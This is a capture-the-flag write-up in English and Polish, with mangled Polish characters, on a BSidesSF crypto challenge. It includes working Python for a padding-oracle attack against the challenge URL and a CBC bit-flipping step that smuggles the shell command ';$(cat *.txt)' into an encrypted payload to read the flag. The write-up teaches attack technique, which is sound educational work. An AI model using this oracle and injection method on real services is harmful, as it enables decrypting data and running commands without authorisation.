# Delphi (web/crypto)

###ENG
[PL](#pl-version)

The task was in `web` category, but actually there was almost no `web` there, only `crypto`.
We get a web interface in which we can invoke three commands from a select box.

The commands are `netstat`, `ps aux`, and `echo "This is a longer string that I want to use to test multiple-block patterns`.

We notice that all those commands actually point to the same endpoint `execute`, with different parameters, eg `/execute/5d60992b1d3ac1d561f6cb4149d540ed4f6d549c64b9d39babc58c0f29324312`
So we deduce that the command itself probably is somehow encrypted in the hex-string.
Since commands have different lengths we can assume that it is most likely block encryption.
By calculating `gcd` over payload lengths we have we can see that block size can be at most 16 bytes.

If we try to modify the payload we quickly hit `decrypt failure` message.
This seems like a nice setup for oracle padding attack, so we import our oracle padding breaker from crypto-commons are try to run it on the payloads.
If you're interested in how padding oracle works see our other writeup which describes this more in detail: https://github.com/p4-team/ctf/tree/master/2016-09-16-csaw/neo
We need to prepare oracle function, which will tell us if the decryption failed (presumably because of incorrect padding after decrypt):

```python
session = requests.Session()

def send(ct):
    while True:
        try:
            url = "http://delphi-status-e606c556.ctf.bsidessf.net/execute/" + ct
            result = session.get(url)
            content = result.content
            return content
        except:
            time.sleep(1)


def oracle(data):
    result = send(data)
    if "decrypt" in result:
        return False
    else:
        return True
```

So we simply send the payload and check if there is `decrypt failed` message in the response.

With this in place we can now run:

```python
from crypto_commons.symmetrical.symmetrical import oracle_padding_recovery

def main():
    ct = '21573ed27b7d10267caebd178a68434c66bb31eabdd648cd38f6a34d53656b00'  # ps aux?
    oracle_padding_recovery(ct, oracle, 16, string.printable)


main()
```

And we manage to recover what we expected -> `ps aux` with PKCS padding.
The same goes for `nestat` command, but the most interesting is the last payload because it has more than a single block we can recover.
The last command ends up to be:

`echo "This is a longer string that I want to use to test multiple-block patterns\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f`

Now that we know that we're dealing with CBC encryption, we can use bitflipping to force the payload to decrypt into plaintext of our choosing, at least up to a single block boundary.

The idea behind this attack comes directly from how CBC mode works.
In CBC encryption the plaintext is XORed with previous ciphertext block before encryption.
During decryption the block is first decrypted and then XORed with previous ciphertext block to recover the real plaintext.
This means, however, that if we modify a single byte of ciphertext of previous block, we will change corresponding byte of the decrypted plaintext in the next block!
Keep in mind this will also mess up the decryption of the changed ciphertext block, but this can't be helped.

What we need is to know the ciphertext and corresponding plaintext.
Then we know that `pt[i] = decrypt(ct[k][i]) ^ ct[k-1][i]` and we know all those values.
So now if we XOR `ct[k-1][i]` with `pt[i]` we should always get 0 as result, since `a xor a = 0`.
And now if we XOR this with any value, we will get this value as decryption result!

Fortunately we also have this in crypto-commons so we proceed with:

```python
    ct = '2ca638d01882452ec38895c06cd42505e2b5f680cccd0e4ee9c05acf697bc8fa0f33c4e66d69f81e1869606244dbc1f8f2cce8a05447037fb83addb8a9e6da032c1d08a5598422aab67283a1fcf6ca6297970b2a226124505751ed5d425fd8717d2da1ff5cd6a806c85fdb3ad3cbb175'  # echo something
    pt = (
         '?' * 16) + 'echo "This is a longer string that I want to use to test multiple-block patterns\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f'
    ct = set_cbc_payload_for_block(ct.decode("hex"), pt, ';$(cat *.txt)   ', 5).encode("hex")
    print(ct)
```

This way we modify the decryption results for 5th block of the ciphertext.
4th block will be broken, but since it's just passed to `echo` we don't really care about it much.
So we just modified the ciphertext to decode into `echo ... garbage;$(cat *.txt)   ` which invoked in the shell will give us the flag.
And if we now go to the `http://delphi-status-e606c556.ctf.bsidessf.net/execute/2ca638d01882452ec38895c06cd42505e2b5f680cccd0e4ee9c05acf697bc8fa0f33c4e66d69f81e1869606244dbc1f8f2cce8a05447037fb83addb8a9e6da03721442aa579369a0e8678fa1b0a4843197970b2a226124505751ed5d425fd8717d2da1ff5cd6a806c85fdb3ad3cbb175` url with our modified ciphertext we get as expected:

`This is a longer string that I want to use??????|??????O??? |??????q)???;FLAG:a1cf81c5e0872a7e0a4aec2e8e9f74c3   `

###PL version

Zadanie co prawda by??o w kategorii `web` ale w praktyce nie by??o tam prawie nic z `web` a jedynie z `crypto`.
Dostajemy webowy interfejs z kt??rego mo??na wykona?? trzy komendy u??ywaj??c select boxa.

Komendy to `netstat`, `ps aux` oraz `echo "This is a longer string that I want to use to test multiple-block patterns`.

Zauwa??amy szybko ??e wszytkie komendy prowadz?? do tego samego endpointu `execue` z innym parametrem, np.
`/execute/5d60992b1d3ac1d561f6cb4149d540ed4f6d549c64b9d39babc58c0f29324312`
Zgadujemy, ??e komenda do wykonania jest zaszyfrowana w tym hex-stringu.
Skoro komendy maj?? r????ne d??ugo??ci to domy??lamy si?? ??e mamy do czynienia z szyfrem blokowym.
Licz??c `gcd` z d??ugo??ci znanych payload??w wynika ??e blok mo??e mie?? najwy??ej 16 bajt??w d??ugo??ci.

Je??li r??cznie zmodyfikujemy payload to szybko dostajemy komunikat `decrypt failure`.
To sugeruje setup dla ataku oracle padding, wi??c importujemy nasz ??amacz z crypto-commons i pr??bujemy uruchomi?? go dla posiadanych szyfrogram??w.
Po szczeg????y dotycz??ce ataku padding oracle odsy??amy do innego writeupa kt??ry napisalismy kilka tygodni temu: https://github.com/p4-team/ctf/tree/master/2016-09-16-csaw/neo#pl-version
Potrzebujemy do tego przygotowa?? sam?? wyrocznie, kt??ra powie nam czy deszyfrowanie si?? powiod??o czy nie (zak??adamy ??e niepowodzenie wynika z niepopranego paddingu po deszyfrowaniu):

```python
session = requests.Session()

def send(ct):
    while True:
        try:
            url = "http://delphi-status-e606c556.ctf.bsidessf.net/execute/" + ct
            result = session.get(url)
            content = result.content
            return content
        except:
            time.sleep(1)


def oracle(data):
    result = send(data)
    if "decrypt" in result:
        return False
    else:
        return True
```

Wi??c po prostu wysy??amy przygotowane dane i sprawdzamy czy w odpowiedzie dostali??my wiadomo???? `decrypt failed`.

Mo??emy teraz uruchomi??:

```python
from crypto_commons.symmetrical.symmetrical import oracle_padding_recovery

def main():
    ct = '21573ed27b7d10267caebd178a68434c66bb31eabdd648cd38f6a34d53656b00'  # ps aux?
    oracle_padding_recovery(ct, oracle, 16, string.printable)


main()
```

I udaje nam si?? odzyska?? oczekiwan?? komend?? -> `ps aux` z paddingiem PKCS.
Tak samo jest dla payloadu z `netstat` ale najciekawszy jest ostatni szyfrogram, bo pozwala odzyska?? wi??cej ni?? 1 blok.
Ostatnia komenda to:

`echo "This is a longer string that I want to use to test multiple-block patterns\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f`

Skoro wiemy ju?? ??e mamy do czynienia z szyfrowaniem w trybie CBC, mo??emy wykorzysta?? bitflipping ??eby zmodyfikowa?? payload tak, aby deszyfrowa?? si?? do wybranego przez nas plaintextu, przynajmniej do granicy jednego bloku.

Idea stoj??ca za tym atakiem wynika bezpo??rednio z dzia??ania trybu CBC.
W tym trybie plaintext jest XORowwany z ciphertextem w poprzednim bloku przed szyfrowaniem.
Podczas deszyfrowania, po odkodowaniu bloku wynik jest XORowany z ciphertextem poprzedniego bloku w celu odzyskania prawdziwego plaintextu.
To oznacza jednak, ??e mo??emy zmodyfikowa?? jeden bajt ciphertextu w poprzednim bloku i tym samym zmieni?? odpowiadaj??cy mu bajt odszyfrowanego plaintextu w kolejnym bloku!
Warto pami??ta??, ??e zniszczymy w ten spos??b odszyfrowan?? warto???? bloku gdzie zmieniamy ciphertext, ale tego nie da si?? omin????.

Potrzebujemy zna?? ciphertext oraz odpowiadaj??cy mu plaintext.
Wiemy ??e `pt[i] = decrypt(ct[k][i]) ^ ct[k-1][i]` i znamy te?? wszystkie te warto??ci.
Teraz je??li XORujemy `ct[k-1][i]` z `pt[i]` powinni??my zawsze po odszyfrowaniu dosta?? 0 poniewa?? `a xor a = 0`.
A teraz je??li XORujemy to z dowoln?? inn?? warto??ci?? to uzyskamy t?? warto???? w wyniku deszyfrowania!

Szcz????liwie mamy to ju?? zaimplementowane w crypto-commons wi??c wykonujemy:

```python
    ct = '2ca638d01882452ec38895c06cd42505e2b5f680cccd0e4ee9c05acf697bc8fa0f33c4e66d69f81e1869606244dbc1f8f2cce8a05447037fb83addb8a9e6da032c1d08a5598422aab67283a1fcf6ca6297970b2a226124505751ed5d425fd8717d2da1ff5cd6a806c85fdb3ad3cbb175'  # echo something
    pt = (
         '?' * 16) + 'echo "This is a longer string that I want to use to test multiple-block patterns\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f\x0f'
    ct = set_cbc_payload_for_block(ct.decode("hex"), pt, ';$(cat *.txt)   ', 5).encode("hex")
    print(ct)
```

W ten spos??b zmieniamy wynik deszyfrowania 5 bloku.
4 blok b??dzie popsuty, ale jest to input dla `echo` wi??c nie przejmuejmy si?? tym specjalnie.
Teraz nasz zmieniony ciphertext powinien zdeszyfrowa?? si?? do czego?? w postaci `echo ... garbage;$(cat *.txt)   ` co wykonane w shellu da nam flag??.
I faktycznie wchodz??c pod URL `http://delphi-status-e606c556.ctf.bsidessf.net/execute/2ca638d01882452ec38895c06cd42505e2b5f680cccd0e4ee9c05acf697bc8fa0f33c4e66d69f81e1869606244dbc1f8f2cce8a05447037fb83addb8a9e6da03721442aa579369a0e8678fa1b0a4843197970b2a226124505751ed5d425fd8717d2da1ff5cd6a806c85fdb3ad3cbb175` url ze zmienionym ciphertextem dostajemy:

`This is a longer string that I want to use??????|??????O??? |??????q)???;FLAG:a1cf81c5e0872a7e0a4aec2e8e9f74c3   `
